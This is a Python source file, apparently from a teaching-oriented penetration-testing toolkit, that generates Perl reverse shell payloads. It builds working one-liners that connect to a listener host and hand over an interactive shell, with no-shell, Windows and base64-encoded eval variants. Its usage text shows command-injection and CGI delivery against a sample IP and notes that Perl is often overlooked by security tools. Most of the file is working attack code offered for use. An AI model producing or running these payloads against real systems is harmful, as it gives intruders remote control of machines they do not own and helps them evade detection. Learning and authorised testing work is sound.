"""
Perl reverse shell payload generator
"""

from .base import PayloadGenerator, PayloadConfig, PayloadExplanation
from learnshells.utils.logger import Logger
from typing import Dict


class PerlGenerator(PayloadGenerator):
    """Generate Perl reverse shell payloads."""
    
    def generate(
        self,
        encode: bool = False,
        obfuscate: bool = False
    ) -> str:
        """
        Generate Perl reverse shell payload.
        
        Args:
            encode: Whether to encode
            obfuscate: Whether to obfuscate
            
        Returns:
            Perl payload string
        """
        # Get lhost and lport from config
        lhost = self.config.lhost
        lport = self.config.lport
        
        # Check if logger exists
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        # Generate payload
        payload = self._generate_reverse_shell()
        
        if encode:
            payload = self.encode_payload(payload, "base64")
            payload = f"perl -MMIME::Base64 -e 'eval(decode_base64(\"{payload}\"))'"
        
        self.logger.success(
            f"Generated Perl payload ({len(payload)} bytes)",
            explain="Perl is often available on Linux/Unix systems and is great for scripting. "
                   "It's a good alternative when Python isn't available."
        )
        
        return payload
    
    def _generate_reverse_shell(self) -> str:
        """Generate standard Perl reverse shell."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
        return payload
    
    def _generate_no_sh_reverse(self) -> str:
        """Generate Perl reverse shell without /bin/sh (useful when exec is restricted)."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
        return payload
    
    def _generate_windows_reverse(self) -> str:
        """Generate Perl reverse shell for Windows."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
        return payload
    
    def test_requirements(self, target_info: Dict) -> bool:
        """
        Test if target meets requirements for Perl payload.
        
        Args:
            target_info: Target information dictionary
            
        Returns:
            True if requirements met
        """
        # Perl is commonly available on Linux/Unix systems
        os_type = target_info.get('os', '').lower()
        if 'linux' in os_type or 'unix' in os_type or 'bsd' in os_type:
            return True
        
        # Also check if explicitly detected
        if target_info.get('has_perl', False):
            return True
        
        # Perl less common but possible on other systems
        return True  # Try anyway since it's widely available
    
    def explain(self, payload: str) -> str:
        """
        Explain Perl payload line by line.
        
        Args:
            payload: Perl payload
            
        Returns:
            Educational explanation
        """
        explanation = """
🎓 PERL REVERSE SHELL EXPLAINED:

Part 1: Import Socket Module
    use Socket;
    Loads the Socket module for network communication.
    Provides functions like socket(), connect(), sockaddr_in(), etc.
    This is Perl's networking library.

Part 2: Set Connection Parameters
    $i = "LHOST"; 
    $p = LPORT;
    Defines IP address ($i) and port ($p) variables.
    These point to your listener.

Part 3: Create Socket
    socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
    Creates a TCP socket named S.
    • PF_INET: IPv4 protocol family
    • SOCK_STREAM: TCP (reliable, connection-oriented)
    • getprotobyname("tcp"): Gets TCP protocol number

Part 4: Connect to Listener
    if(connect(S, sockaddr_in($p, inet_aton($i)))) {
    Attempts to connect socket S to your listener.
    • sockaddr_in(): Creates socket address structure
    • inet_aton(): Converts IP string to network format
    • Returns true if connection succeeds

Part 5: Redirect File Descriptors
    open(STDIN, ">&S");   # Redirect input from socket
    open(STDOUT, ">&S");  # Redirect output to socket
    open(STDERR, ">&S");  # Redirect errors to socket
    
    The ">&S" syntax duplicates the socket file descriptor.
    This makes all shell I/O go through the network connection.

Part 6: Execute Shell
    exec("/bin/sh -i");
    Replaces current process with interactive shell.
    • /bin/sh: Bourne shell (universal on Unix)
    • -i: Interactive mode
    • All I/O goes through the socket (redirected above)

ALTERNATIVE METHOD (No /bin/sh):
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET...'
    
    This version doesn't spawn /bin/sh directly.
    Instead it:
    1. Forks a background process
    2. Creates socket connection
    3. Reads commands from socket
    4. Executes with system() call
    5. Returns output through socket
    
    Useful when:
    • exec() is restricted
    • /bin/sh is disabled
    • Running as restricted user

WHY PERL?
• Pre-installed on most Linux/BSD systems
• Powerful text processing and scripting
• Good networking capabilities
• Often overlooked by security tools
• One-liner friendly

WHEN TO USE PERL:
✓ Python not available
✓ Legacy Unix/Linux systems
✓ BSD systems (often has Perl by default)
✓ Web servers (often installed for CGI)
✗ Modern minimalist containers
✗ Windows (unless explicitly installed)

COMMON PERL LOCATIONS:
• /usr/bin/perl
• /usr/local/bin/perl
• /opt/perl/bin/perl

LIMITATIONS:
• Less common on modern minimal systems
• Syntax can be cryptic
• Not as feature-rich as Python
• May not be on Windows systems
"""
        return explanation
    
    def generate_variants(self) -> dict:
        """
        Generate multiple Perl payload variants.
        
        Returns:
            Dict of payload variants
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        variants = {}
        
        # Standard reverse shell with /bin/sh
        variants['standard'] = self._generate_reverse_shell()
        
        # No shell version (when exec is restricted)
        variants['no_shell'] = self._generate_no_sh_reverse()
        
        # Windows version
        variants['windows'] = self._generate_windows_reverse()
        
        # Base64 encoded
        variants['encoded'] = self.generate(encode=True)
        
        return variants
    
    def get_usage_instructions(self) -> str:
        """Get instructions for using Perl payloads."""
        instructions = """
📋 PERL PAYLOAD USAGE:

Method 1: Direct Execution
perl -e 'use Socket; YOUR_PAYLOAD'

Method 2: From File
echo 'use Socket; YOUR_PAYLOAD' > shell.pl
perl shell.pl

Method 3: Command Injection
; perl -e 'use Socket;$i="10.10.14.5";$p=443;...'

Method 4: CGI Script
#!/usr/bin/perl
use Socket;
$i="10.10.14.5";
$p=443;
...

CHECKING AVAILABILITY:
# Check if Perl is installed
which perl
perl --version

# Common paths
/usr/bin/perl
/usr/local/bin/perl

TIPS:
• Perl one-liners start with: perl -e '...'
• Use single quotes to avoid shell interpretation
• The -M flag imports modules: perl -MIO -e '...'
• Semicolons separate statements in one-liners

PAYLOAD SELECTION:
Standard: Use when /bin/sh available (most cases)
No Shell: Use when exec() restricted or /bin/sh disabled
Windows: Use on Windows systems with Perl installed

TROUBLESHOOTING:
Issue: "Can't locate Socket.pm"
Fix: Socket module not installed, try different payload

Issue: "Permission denied" on exec
Fix: Use the "no_shell" variant

Issue: Payload doesn't work
Fix: Check Perl version: perl -v
     Try simpler payload first

ADVANTAGES OVER OTHER LANGUAGES:
• More likely on old/legacy systems than Python 3
• Good for BSD systems (FreeBSD, OpenBSD)
• Often on web servers for CGI scripts
• Can be very compact for one-liners

USE CASES:
✓ Old Linux distributions
✓ BSD systems
✓ Web servers with CGI
✓ When Python unavailable
✓ Legacy Unix systems
"""
        return instructions
    
    def test_availability(self) -> str:
        """Generate command to test if Perl is available on target."""
        test_cmd = "which perl && perl --version"
        
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        self.logger.info(
            "Perl availability test command generated",
            explain="Run this on the target to check if Perl is installed and get version info."
        )
        
        return test_cmd
    
    def get_compatibility_notes(self) -> str:
        """Get Perl version compatibility notes."""
        notes = """
PERL VERSION COMPATIBILITY:

Perl 5.x (Modern - Recommended):
✓ All payloads work
✓ Socket module available
✓ IO module available
✓ Full feature set

Perl 4.x (Legacy - Limited):
⚠ Basic socket code works
⚠ Some modules may be missing
⚠ Limited functionality

Common Issues:
1. Missing Socket module
   - Very rare, Socket is core module
   - Try: perl -MSocket -e 'print "OK\\n"'

2. Missing IO module
   - Use standard version instead of no_shell version
   - IO was added in Perl 5.004

3. Windows Perl (ActivePerl/Strawberry Perl)
   - Works but less common
   - May need special handling for paths
   - Use windows variant

Version Check:
perl -v | grep version
perl -MSocket -e 'print "Socket OK\\n"'
perl -MIO -e 'print "IO OK\\n"'
"""
        return notes
